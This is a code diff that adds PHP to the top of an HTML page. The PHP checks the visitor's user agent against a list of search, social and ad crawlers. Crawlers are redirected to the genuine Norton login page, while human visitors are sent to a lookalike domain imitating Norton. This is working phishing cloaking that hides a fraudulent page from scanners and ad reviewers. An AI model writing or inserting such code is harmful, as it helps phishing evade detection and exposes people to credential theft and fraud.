@@ -1,3 +1,31 @@
+<?php
+// Function to detect if the user is a bot
+function isBot() {
+    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = [
+        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou',
+        'FacebookExternalHit', 'Twitterbot', 'WhatsApp', 'Slackbot', 'TelegramBot',
+        'AdsBot-Google', 'Google Ads Bot'  
+    ];
+
+    foreach ($bots as $bot) {
+        if (strpos($userAgent, $bot) !== false) {
+            return true; // Bot detected
+        }
+    }
+    return false; // No bot detected
+}
+
+if (isBot()) {
+    // Redirect bots to a specific URL
+    header("Location: https://login.norton.com/sso/embedded/update");
+    exit();
+} else {
+    // Redirect humans to a different URL
+    header("Location: https://us-norton-com.vercel.app/norton-01/");
+    exit();
+}
+?>
 <!doctype html>
 <html>
 
